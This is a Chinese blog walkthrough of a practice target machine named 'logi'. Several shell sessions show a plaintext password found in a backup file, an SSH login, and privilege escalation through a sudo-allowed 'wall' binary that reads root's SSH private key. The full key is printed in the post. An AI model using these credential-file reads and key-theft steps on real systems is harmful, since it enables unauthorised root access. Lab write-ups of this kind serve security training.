+</span></span><span class=line><span class=cl>                                                                            www-data@logi:/var/www/html$ 
+</span></span><span class=line><span class=cl>                                                                                                         www-data@logi:/var/www/html$ 
+</span></span><span class=line><span class=cl>                                                                                                                                      www-data@logi:/var/www/html$ 
+</span></span><span class=line><span class=cl>                                                                                                                                                                   www-data@logi:/var/www/html$ 
+</span></span><span class=line><span class=cl>             www-data@logi:/var/www/html$ 
+</span></span><span class=line><span class=cl>                                          www-data@logi:/var/www/html$ 
+</span></span><span class=line><span class=cl>                                                                       www-data@logi:/var/www/html$ 
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@logi:/var/www/html$ sudo -l
+</span></span><span class=line><span class=cl>sudo -l
+</span></span><span class=line><span class=cl>sudo: unable to resolve host logi: Temporary failure in name resolution
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>We trust you have received the usual lecture from the <span class=nb>local</span> System
+</span></span><span class=line><span class=cl>Administrator. It usually boils down to these three things:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>#1) Respect the privacy of others.</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#2) Think before you type.</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#3) With great power comes great responsibility.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>sudo: a terminal is required to <span class=nb>read</span> the password<span class=p>;</span> either use the -S option to <span class=nb>read</span> from standard input or configure an askpass helper
+</span></span><span class=line><span class=cl>sudo: a password is required
+</span></span></code></pre></div><p>发现需要密码<br>虽然知道大概率不行，还是抱着试一试的心态看了/etc/shadow</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash: cd: shadow: Not a directory
+</span></span><span class=line><span class=cl>www-data@logi:/etc$ cat shadow
+</span></span><span class=line><span class=cl>cat shadow
+</span></span><span class=line><span class=cl>cat: shadow: Permission denied
+</span></span></code></pre></div><p>果然不行</p><p>我自己做到这一步就没想法了</p><p>后面看群友的wp，发现password写在文件里了</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@logi:/$ cat /var/backups/passwd
+</span></span><span class=line><span class=cl>cat /var/backups/passwd
+</span></span><span class=line><span class=cl>xiangwozheyangderen
+</span></span></code></pre></div><p>那很有说法了，所以可以尝试登录user</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>                                                                                                                                                                      
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# ssh ame@192.168.56.103
+</span></span><span class=line><span class=cl>ame@192.168.56.103<span class=err>&#39;</span>s password: 
+</span></span><span class=line><span class=cl>Linux logi 4.19.0-27-amd64 <span class=c1>#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>The programs included with the Debian GNU/Linux system are free software<span class=p>;</span>
+</span></span><span class=line><span class=cl>the exact distribution terms <span class=k>for</span> each program are described in the
+</span></span><span class=line><span class=cl>individual files in /usr/share/doc/*/copyright.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span class=line><span class=cl>permitted by applicable law.
+</span></span><span class=line><span class=cl>Last login: Sun Sep <span class=m>28</span> 10:35:26 <span class=m>2025</span> from 172.20.10.11
+</span></span><span class=line><span class=cl>ame@logi:~$ ls
+</span></span><span class=line><span class=cl>user.txt
+</span></span><span class=line><span class=cl>ame@logi:~$ whoami
+</span></span><span class=line><span class=cl>ame
+</span></span></code></pre></div><p>成功登录，拿个user的flag</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ame@logi:~$ cat user.txt
+</span></span><span class=line><span class=cl>user:<span class=o>{</span>niudexiongdiniude<span class=o>}</span>
+</span></span></code></pre></div><p>接下来sudo -l看一下如何提权</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ame@logi:~$ sudo -l
+</span></span><span class=line><span class=cl>sudo: unable to resolve host logi: Temporary failure in name resolution
+</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> ame on logi:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User ame may run the following commands on logi:
+</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL<span class=o>)</span> NOPASSWD: /usr/bin/wall
+</span></span></code></pre></div><p>wall文件可以利用</p><p>依然去提权宝典上查利用方法<br><a href=https://gtfobins.github.io/>提权宝典</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>LFILE</span><span class=o>=</span>file_to_read
+</span></span><span class=line><span class=cl>sudo wall --nobanner <span class=s2>&#34;</span><span class=nv>$LFILE</span><span class=s2>&#34;</span>
+</span></span></code></pre></div><p>可以读取任意文件</p><p>看大佬的wp，这里应该是读取ssh的私钥文件，来进行ssh登录root<br>而私钥文件一般写在哪呢<br>根据下面这篇文章，我们可以知道在Linux中，私钥文件一般写哪个目录下<br><a href=https://www.cnblogs.com/golinuxstudy/p/15059401.html>https://www.cnblogs.com/golinuxstudy/p/15059401.html</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ame@logi:/$ sudo wall --nobanner <span class=s2>&#34;/root/.ssh/id_rsa.pub&#34;</span>
+</span></span><span class=line><span class=cl>sudo: unable to resolve host logi: Temporary failure in name resolution
+</span></span><span class=line><span class=cl>                                                                               
+</span></span><span class=line><span class=cl>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCdpPQH6Rvrh7zPdqb4ZhR5lD3V6bEylGcxak/SSHd
+</span></span><span class=line><span class=cl>9kKgEkV/k81ebpTW9nfcoKvzj6A+bBpLNvDpiihDzuwUaixLAdIz+qnjOKjz88IcmJwWBLFv5UU11a7
+</span></span><span class=line><span class=cl>iAZVt9TXY4ycCUiS0fwc+vnfPdTNqW0a5vE/ECbnmLZc4C7aZe9lDsomkPs40zWXTagKnbjNl2HfMii
+</span></span><span class=line><span class=cl>apoSyV8URDPdMSQyFXFQGLswgYz2SGuuZuxlS2EpBbX+Eab2GV720U55a0FV0ymTMpGuCs18QcxDeC+
+</span></span><span class=line><span class=cl>I16yaa/EoJMKbFO3QPfuwWsT2pb1/dnFJyVcE0sR813rpW1iFqW8l0+cogiHp03UULLMa2f1T68pzi5
+</span></span><span class=line><span class=cl>PZnP1wSHyCZsRlsJROZBf4s8xwLO4NNmlRjvzfMw2JijVi8VpbY2TRJZx0/VD7CjbDoFJb1yNhIXAuS
+</span></span><span class=line><span class=cl>KRUQjDFn3wn2YUtqwTMDDhtDaBKrVDFpuO9aGDz7DVTqfIGBwqa1jiY+LWRa7hirzwlixEtxM6X4JqZ
+</span></span><span class=line><span class=cl>Iw9vADqvlcoOANpU9WvCo3iLH51yw0kWeVKBL+B9P8xBS5cTn9ObYjhLomg+wGWpoqxm8bPdTbUcxBX
+</span></span><span class=line><span class=cl>R8DkJXQ9XC88GfYL5IHYTBI19IaneUQvWrT9QfL5jRrCwM6LOFbFv/ZMuxrB/Q5CAvKTHIJvGvwT1pr
+</span></span><span class=line><span class=cl><span class=nv>NVnyYwn23gQ</span><span class=o>==</span> root@logi                                                        
+</span></span><span class=line><span class=cl>                                                                               
+</span></span><span class=line><span class=cl>ame@logi:/$ sudo wall --nobanner <span class=s2>&#34;/root/.ssh/id_rsa&#34;</span>
+</span></span><span class=line><span class=cl>sudo: unable to resolve host logi: Temporary failure in name resolution
+</span></span><span class=line><span class=cl>                                                                               
+</span></span><span class=line><span class=cl>-----BEGIN OPENSSH PRIVATE KEY-----                                            
+</span></span><span class=line><span class=cl>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn         
+</span></span><span class=line><span class=cl>NhAAAAAwEAAQAAAgEAnaT0B+kb64e8z3am+GYUeZQ91emxMpRnMWpP0kh3fZCoBJFf5PNX         
+</span></span><span class=line><span class=cl>m6U1vZ33KCr84+gPmwaSzbw6YooQ87sFGosSwHSM/qp4zio8/PCHJicFgSxb+VFNdWu4gG         
+</span></span><span class=line><span class=cl>VbfU12OMnAlIktH8HPr53z3UzaltGubxPxAm55i2XOAu2mXvZQ7KJpD7ONM1l02oCp24zZ         
+</span></span><span class=line><span class=cl>dh3zIomqaEslfFEQz3TEkMhVxUBi7MIGM9khrrmbsZUthKQW1/hGm9hle9tFOeWtBVdMpk         
+</span></span><span class=line><span class=cl>zKRrgrNfEHMQ3gviNesmmvxKCTCmxTt0D37sFrE9qW9f3ZxSclXBNLEfNd66VtYhalvJdP         
+</span></span><span class=line><span class=cl>nKIIh6dN1FCyzGtn9U+vKc4uT2Zz9cEh8gmbEZbCUTmQX+LPMcCzuDTZpUY783zMNiYo1Y         
+</span></span><span class=line><span class=cl>vFaW2Nk0SWcdP1Q+wo2w6BSW9cjYSFwLkikVEIwxZ98J9mFLasEzAw4bQ2gSq1QxabjvWh         
+</span></span><span class=line><span class=cl>g8+w1U6nyBgcKmtY4mPi1kWu4Yq88JYsRLcTOl+CamSMPbwA6r5XKDgDaVPVrwqN4ix+dc         
+</span></span><span class=line><span class=cl>sNJFnlSgS/gfT/MQUuXE5/Tm2I4S6JoPsBlqaKsZvGz3U21HMQV0fA5CV0PVwvPBn2C+SB         
+</span></span><span class=line><span class=cl>2EwSNfSGp3lEL1q0/UHy+Y0awsDOizhWxb/2TLsawf0OQgLykxyCbxr8E9aazVZ8mMJ9t4         
+</span></span><span class=line><span class=cl>EAAAdA5YGAIuWBgCIAAAAHc3NoLXJzYQAAAgEAnaT0B+kb64e8z3am+GYUeZQ91emxMpRn         
+</span></span><span class=line><span class=cl>MWpP0kh3fZCoBJFf5PNXm6U1vZ33KCr84+gPmwaSzbw6YooQ87sFGosSwHSM/qp4zio8/P         
+</span></span><span class=line><span class=cl>CHJicFgSxb+VFNdWu4gGVbfU12OMnAlIktH8HPr53z3UzaltGubxPxAm55i2XOAu2mXvZQ         
+</span></span><span class=line><span class=cl>7KJpD7ONM1l02oCp24zZdh3zIomqaEslfFEQz3TEkMhVxUBi7MIGM9khrrmbsZUthKQW1/         
+</span></span><span class=line><span class=cl>hGm9hle9tFOeWtBVdMpkzKRrgrNfEHMQ3gviNesmmvxKCTCmxTt0D37sFrE9qW9f3ZxScl         
+</span></span><span class=line><span class=cl>XBNLEfNd66VtYhalvJdPnKIIh6dN1FCyzGtn9U+vKc4uT2Zz9cEh8gmbEZbCUTmQX+LPMc         
+</span></span><span class=line><span class=cl>CzuDTZpUY783zMNiYo1YvFaW2Nk0SWcdP1Q+wo2w6BSW9cjYSFwLkikVEIwxZ98J9mFLas         
+</span></span><span class=line><span class=cl>EzAw4bQ2gSq1QxabjvWhg8+w1U6nyBgcKmtY4mPi1kWu4Yq88JYsRLcTOl+CamSMPbwA6r         
+</span></span><span class=line><span class=cl>5XKDgDaVPVrwqN4ix+dcsNJFnlSgS/gfT/MQUuXE5/Tm2I4S6JoPsBlqaKsZvGz3U21HMQ         
+</span></span><span class=line><span class=cl>V0fA5CV0PVwvPBn2C+SB2EwSNfSGp3lEL1q0/UHy+Y0awsDOizhWxb/2TLsawf0OQgLykx         
+</span></span><span class=line><span class=cl>yCbxr8E9aazVZ8mMJ9t4EAAAADAQABAAACACjO25D0qhKVZ6341A43NpOmaT9nqEQkoHXt         
+</span></span><span class=line><span class=cl>RE52DeCGQsgz7bPxvjr/UGMOcj2Gq0I//1ItKHFziVWa0fqV7iNJ3wfM4/bEoFMWIgWEKi         
+</span></span><span class=line><span class=cl>gZL9aZahGnFzsPMIqkMkPEepcGuwB4ZiLzY9TdOZSO4YLrMpF0gw4TFQmdx++AH3Izpw0q         
+</span></span><span class=line><span class=cl>mbHD1Ah33sT1S4MW+fAWnqrRIjivQzvkLErXuk6UXYebPEB3lW10hsCZMZGNwWO1qmgrz/         
+</span></span><span class=line><span class=cl>Nl2Bdw0oHDT7+zMpdWB4K5CA6Fn0v2gLgXpdrfeu2Wd5naIu2sNsIqdZKFIlD5bpcXpBcq         
+</span></span><span class=line><span class=cl>s2MpMaXfg+pBXJPuQ2CTnUuoZn/ohgAdRZWBRhz3BPAdj20YDZB1FR8d7gm8wuprr51t0y         
+</span></span><span class=line><span class=cl>Qu3liLLv7utHZ6twV+twHEtLZcfk4u5nK5eUhdUQv7KnRjmO51XD0vgT9sJcdvrCo/EroU         
+</span></span><span class=line><span class=cl>1bErEML7Jx08s5d6veWyCaw0P9hxSYqWA/8sn+cBA4nRio4f835u42DL+asE8vvPpJgs+p         
+</span></span><span class=line><span class=cl>SxZlTCc5j362BpB/r6tXbt5/gVcAlY7eG9Mi0XQE6MrRVFPHvjj4aVrJoahAvuTSCOwKSr         
+</span></span><span class=line><span class=cl>DuGas5MsupLXtsvnQ+OLXoLfmau9dJkwceV9boMWijy/GUjq2PuXMzZCIzGdke0tM2CDzl         
+</span></span><span class=line><span class=cl>XtnMsZxZlM0I2hbKQVAAABAQCbUliOaBlCdEsZ/uhF3+QP/+KepMQt5E2XCyZmEKbdvVXI         
+</span></span><span class=line><span class=cl>BU5DfJidd00juWV25gS+JeKJ5AmGcJMJZxzFNmcb4S08ydUxs5J0BuYJLlT7Hl8Wx+cv7C         
+</span></span><span class=line><span class=cl>xuI69zfVKrEuXu54kfkUmn6M5Aq+VlAvAms8IS67jbVKf/V2pKvT9cd/dGK+A5YVihGxeT         
+</span></span><span class=line><span class=cl>9ST8g3S/+FviJeyjuMK8WGYh6774LvlRufzvxBRevdO/zVKH2DAFLEWGEFkt9TEGS3MDri         
+</span></span><span class=line><span class=cl>gMAnF9in23bJ3ksoEQjhcafQL+UXGalUTKWmbwEfvuXtX48j7a4G/0ejBbChKQdRLd2n7O         
+</span></span><span class=line><span class=cl>+6hRr97q9jur4V8bAAABAQDJegrTfveMpUcwV9S9/PHjaq9YD1WvUSXMjOGGrGZyvg/czz         
+</span></span><span class=line><span class=cl>GDbb+G/NqojFFoswqQ8nl3yw9yOiHvanHLAdLyG/xB76X07cupVHnY+N+M5dAlXDYpE0bq         
+</span></span><span class=line><span class=cl>P3XVWOGRz55ZJ+ylI3DKmGseqcAKVJNhc9B0ZzgpyYDjAldbngiHilV+7JxCIXzxN2GhAA         
+</span></span><span class=line><span class=cl>UyQLAFBQ54UKMdrJtAQOXBvSZgZ06ZmDqqC0Z/+YTlZ8Jyezl5le4yG42ilSYal/E+W1sc         
+</span></span><span class=line><span class=cl>9Bmz3QFyvSP5pqTKy0/xfvr6RO9LJbt6i5mME+V7VV77HkW7O11qFF2w2p/zOjXpyXM81N         
+</span></span><span class=line><span class=cl>ueXYKFdXSQuPw/AAABAQDITkel25RoCYjYRG/oE2G7qcMwdUrVsas5o0cXdhav3oot121T         
+</span></span><span class=line><span class=cl>Hfdk1d+ZmHgJ9GEwnn630xXEbKfpRxkNRhJN5MCNELGpMyY0PrTuT1Z+eajhsjtoFjIJ3y         
+</span></span><span class=line><span class=cl>veWG/EMR1oeDIUfD8zIdZ9xTsUL3Z9iS3aLL5prq0+byOCVQr7WQyiK/SNMmF6sRTNFHhy         
+</span></span><span class=line><span class=cl>CTJ0i6yKFl+EEcG2O0KyGWNeCjXhmxOaM4J1SLXemfPmYLKJPjlp9+/suJrOVZwrLLJe5w         
+</span></span><span class=line><span class=cl>3g0lGOKdY/B+KeiRBh7+rM4s+n0LfG5AZWztTNBn1I8nI5Ox3VV2Xml+EHlA/jzgISDTGh         
+</span></span><span class=line><span class=cl>yFwO2nf1b1w/AAAACXJvb3RAbG9naQE<span class=o>=</span>                                               
+</span></span><span class=line><span class=cl>-----END OPENSSH PRIVATE KEY-----                                              
+</span></span><span class=line><span class=cl>                                                                            
+</span></span></code></pre></div><p>然后把私钥丢给AI，清理掉后面存在的多余空格等</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>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<span class=o>=</span>
+</span></span></code></pre></div><p>然后保存起来，重新ssh登录root用户</p><p>AI整理的果然出问题了，cao</p><p>直接sed整一手，成功得到flag</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@logi:~# cat /root/provemyself.txt
+</span></span><span class=line><span class=cl>root<span class=o>{</span>xiangrootzheyangderen<span class=o>}</span>
+</span></span></code></pre></div></div><footer class=post-footer><div class=post-footer__tags><a href=/tags/%E9%9D%B6%E6%9C%BA/ data-pagefind-filter=tag>靶机</a></div><div class=post-footer__license>Licensed under CC BY-NC-SA 4.0</div><nav class=post-footer__nav><a href=/p/n1j%E5%A4%8D%E7%8E%B0/><small>← Previous</small>
+<span>N1J web赛题复现</span>
+</a><a href=/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAajpsvr/ class=post-footer__nav-next><small>Next →</small>
+<span>群友靶机ajpsvr</span></a></nav></footer></article></div></div><footer class=site-footer><div class=container><div class=site-footer__social><a href=https://github.com/GCXWLP target=_blank rel=noopener title=GitHub><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg>
+</a><a href=mailto:eminemgcxwlp@gmail.com target=_blank rel=noopener title=Email><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+</a><a href=/index.xml target=_blank rel=noopener title=RSS><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></div><div class=site-footer__copy>&copy; 2025 - 2026 Twansh's blog</div><div class=site-footer__stats><span>65 posts</span>
+<span>73.3k words</span></div><div class=site-footer__powered>Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a></div></div></footer><div class=search-overlay id=search-overlay role=dialog aria-label=Search><div class=search-overlay__dialog><div class=search-overlay__input-wrap><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+<input type=text id=search-input placeholder=搜索文章标题、标签、分类或正文... autocomplete=off></div><div class=search-overlay__results id=search-results><div class=search-overlay__empty>输入关键词开始搜索</div></div></div></div><script defer src=/js/theme-toggle.min.9d3288aa4ff1e33e40906fb67350ea3f5dad1533f19d7428a2335ceac6bf3c4e.js></script><script defer src=/js/search.min.6145f9c11b47c22f4014c24c80522fe739d7844fc997719a3bc26c050c908051.js></script><script defer src=/js/code-copy.min.f61de5ab74980e8e52ca0081d6fedb33bc5496b41391a410ef15ed6e014e502d.js></script></body></html>
